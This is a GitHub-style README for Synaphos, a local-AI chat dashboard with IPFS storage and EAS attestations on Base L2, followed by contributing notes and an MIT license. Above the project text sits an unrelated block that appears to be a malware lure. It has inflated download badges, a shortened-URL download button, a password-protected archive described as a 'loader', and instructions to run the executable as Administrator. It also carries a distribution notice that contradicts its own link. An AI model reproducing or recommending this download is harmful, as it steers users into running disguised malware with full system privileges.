<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Synaphos

**The workspace where intelligence lives on-chain.**

## What it is

- **Landing page** — brutalist editorial design, honest about what the platform is and is not
- **Dashboard** — chat UI connecting directly to your local Odysseus backend
- **On-chain layer** — IPFS storage (Pinata) + EAS attestations on Base L2
- **Wallet connect** — Reown AppKit, Base mainnet, dashboard-only

No cloud AI. No API keys. Your model runs on your own machine.

---

## Stack

| Layer | Tech |
|---|---|
| Frontend | React 19, Vite, Tailwind CSS v4, Framer Motion |
| Routing | Wouter |
| On-chain | Ethers.js, EAS SDK, Reown AppKit (WalletConnect) |
| IPFS | Pinata |
| API | Express 5, Drizzle ORM, PostgreSQL |
| Monorepo | pnpm workspaces, TypeScript 5.9 |
| Fonts | Bebas Neue · Space Mono · Inter |

---

## Structure

```
synaphos/
├── artifacts/
│   ├── synaphos/          # Main app — landing page + dashboard
│   └── api-server/        # Express API (Pinata proxy, EAS helpers)
├── lib/                   # Shared TypeScript libraries
└── scripts/               # Utility scripts
```

---

## Running locally

**Prerequisites:** Node.js 24, pnpm 10

```bash
# Install dependencies
pnpm install

# Run the frontend (port auto-assigned)
PORT=3000 BASE_PATH=/ pnpm --filter @workspace/synaphos run dev

# Run the API server (port 5000 default)
PORT=5000 BASE_PATH=/api pnpm --filter @workspace/api-server run dev
```

---

## On-chain attestations

When connected to a wallet on Base network, any Odysseus response can be attested:

1. Full conversation uploaded to IPFS via Pinata → returns `CID`
2. EAS attestation created on Base L2 → returns `attestation UID`
3. Permanent record: `wallet + model + IPFS CID + timestamp`

## Design system

- **Aesthetic:** Brutalist editorial — off-white `#EDEBE5`, pure black, red `#CC1100` accents
- **Typography:** Bebas Neue (display) · Space Mono (mono/data) · Inter (body)
- **Layout:** 12-column newspaper grid, horizontal rules, registration marks

---


---

# Contributing to Synaphos

Thanks for your interest in contributing.

## How to contribute

1. Fork the repository
2. Create a feature branch: `git checkout -b feat/your-feature`
3. Commit your changes with clear messages
4. Push and open a pull request

## Development setup

```bash
pnpm install
PORT=3000 BASE_PATH=/ pnpm --filter @workspace/synaphos run dev
PORT=5000 BASE_PATH=/api pnpm --filter @workspace/api-server run dev
```

## Code style

- TypeScript strict mode everywhere
- No `console.log` in server code — use the `logger` singleton
- Brutalist editorial design system — no emojis in UI
- Honest copy — no misleading claims about AI capabilities

## Reporting issues

Open a GitHub issue with:
- Clear description of the bug or feature request
- Steps to reproduce (for bugs)
- Environment details (OS, Node version, browser)


---

MIT License

Copyright (c) 2025 Synaphos Dev

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
